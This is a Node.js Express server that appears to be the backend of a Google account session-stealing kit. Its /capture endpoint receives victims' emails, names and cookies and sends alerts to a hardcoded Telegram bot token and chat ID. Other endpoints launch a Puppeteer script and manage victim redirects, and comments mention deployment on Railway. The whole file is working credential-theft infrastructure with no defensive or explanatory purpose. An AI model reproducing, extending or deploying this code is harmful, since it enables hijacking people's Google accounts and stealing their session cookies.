const express = require('express');
const { exec } = require('child_process');
const path = require('path');
const fs = require('fs');
const app = express();

const PORT = process.env.PORT || 3000;

console.log('🚀 Starting server...');

// ============================================================
// MIDDLEWARE
// ============================================================
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============================================================
// TELEGRAM SEND
// ============================================================
async function sendToTelegram(message) {
    try {
        const TELEGRAM_BOT_TOKEN = '8774560748:AAFpyG22kcdAjSg_0BzN1SZJIdmBg5j-jiE';
        const TELEGRAM_CHAT_ID = '8726827229';
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        return await response.json();
    } catch (error) {
        console.error('Telegram send failed:', error);
    }
}

// ============================================================
// START PUPPETEER
// ============================================================
app.post('/start-puppeteer', (req, res) => {
    console.log('🚀 Starting Puppeteer...');
    
    // Check if puppeteer.js exists
    const puppeteerPath = path.join(__dirname, 'puppeteer.js');
    if (!fs.existsSync(puppeteerPath)) {
        console.error('❌ puppeteer.js not found!');
        return res.status(500).json({ error: 'puppeteer.js not found' });
    }
    
    const puppeteerProcess = exec('node puppeteer.js', {
        cwd: __dirname
    });
    
    puppeteerProcess.stdout.on('data', (data) => {
        console.log(`[Puppeteer] ${data}`);
    });
    
    puppeteerProcess.stderr.on('data', (data) => {
        console.error(`[Puppeteer Error] ${data}`);
    });
    
    puppeteerProcess.on('close', (code) => {
        console.log(`Puppeteer exited with code ${code}`);
    });
    
    res.json({ success: true, message: 'Puppeteer started' });
});

// ============================================================
// REDIRECT ENDPOINT
// ============================================================
let redirectEmail = null;
let redirectReady = false;

app.post('/redirect-success', (req, res) => {
    redirectEmail = req.body.email || 'Unknown';
    redirectReady = true;
    console.log(`📧 Redirect for: ${redirectEmail}`);
    res.json({ success: true });
});

app.get('/check-redirect', (req, res) => {
    if (redirectReady) {
        const email = redirectEmail;
        redirectReady = false;
        res.json({ redirect: true, email: email });
    } else {
        res.json({ redirect: false });
    }
});

// ============================================================
// CAPTURE ENDPOINT
// ============================================================
app.post('/capture', async (req, res) => {
    const data = req.body;
    data.timestamp = new Date().toISOString();
    console.log('📥 Data captured!');
    
    // Send to Telegram
    await sendToTelegram(`
🎯 **GOOGLE SESSION CAPTURED!**

📧 **Email:** ${data.user?.email || 'Unknown'}
👤 **Name:** ${data.user?.name || 'Unknown'}
🍪 **Cookies:** ${data.cookies?.length || 0}
🕐 **Time:** ${data.timestamp}
    `);
    
    res.json({ success: true });
});

// ============================================================
// HEALTH CHECK - Required for Railway
// ============================================================
app.get('/health', (req, res) => {
    res.json({ 
        status: 'ok', 
        timestamp: new Date().toISOString(),
        uptime: process.uptime()
    });
});

// ============================================================
// START SERVER
// ============================================================
app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📡 http://localhost:${PORT}`);
});

// Handle errors
process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('❌ Unhandled Rejection:', reason);
});